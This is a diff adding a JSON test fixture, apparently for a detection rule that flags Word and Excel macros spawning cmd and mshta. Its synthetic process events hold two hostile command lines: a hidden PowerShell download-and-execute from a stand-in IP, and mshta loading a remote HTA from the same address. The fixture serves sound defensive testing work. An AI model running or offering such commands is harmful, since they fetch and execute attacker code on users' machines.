@@ -1,0 +1,26 @@
+{
+  "description": "Macro document spawning cmd and mshta",
+  "expected_alerts": 2,
+  "events": [
+    {
+      "@timestamp": "2026-09-14T10:00:00Z",
+      "EventID": 1,
+      "Computer": "WS-FIN-022",
+      "User": "CORP\\jsmith",
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "cmd.exe /c powershell -nop -w hidden -c \"iex(iwr http://198.51.100.23/s)\"",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "ParentCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\jsmith\\Downloads\\Invoice_4471.docm\""
+    },
+    {
+      "@timestamp": "2026-09-14T10:03:20Z",
+      "EventID": 1,
+      "Computer": "WS-FIN-019",
+      "User": "CORP\\tnguyen",
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe http://198.51.100.23/p.hta",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+      "ParentCommandLine": "EXCEL.EXE"
+    }
+  ]
+}
